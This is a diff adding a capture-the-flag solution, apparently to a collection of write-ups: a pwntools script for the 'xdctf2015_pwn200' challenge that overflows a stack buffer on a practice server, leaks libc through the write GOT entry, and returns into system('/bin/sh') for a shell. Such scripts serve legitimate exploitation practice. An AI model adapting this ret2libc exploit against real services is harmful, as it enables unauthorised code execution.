@@ -674,3 +674,33 @@ Add(100)
 
 p.interactive()
 ```
+
+### xdctf2015_pwn200
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './bof'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 28510)
+e = ELF(filename)
+# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+libc = ELF('/home/ubuntu/glibc-lib/buuoj-ubuntu-16-glibc-2.23.so')
+
+payload_leak = b'\x11' * (0x6c + 4) + p32(e.plt['write']) + p32(e.sym['main']) + p32(1) + p32(e.got['write']) + p32(4)
+
+p.recvuntil(b'XDCTF2015~!\n')
+p.sendline(payload_leak)
+
+c_func_addr = u32(p.recv(4))
+libc_base_addr = c_func_addr - libc.sym['write']
+system_addr = libc_base_addr + libc.sym['system']
+bin_sh_addr = libc_base_addr + 0x0015902b
+log.success(f'write={hex(c_func_addr)}, libc base={hex(libc_base_addr)}')
+
+payload_exploit = b'\x11' * (0x6c + 4) + p32(system_addr) + p32(e.sym['main']) + p32(bin_sh_addr)
+
+p.sendline(payload_exploit)
+p.interactive()
+```
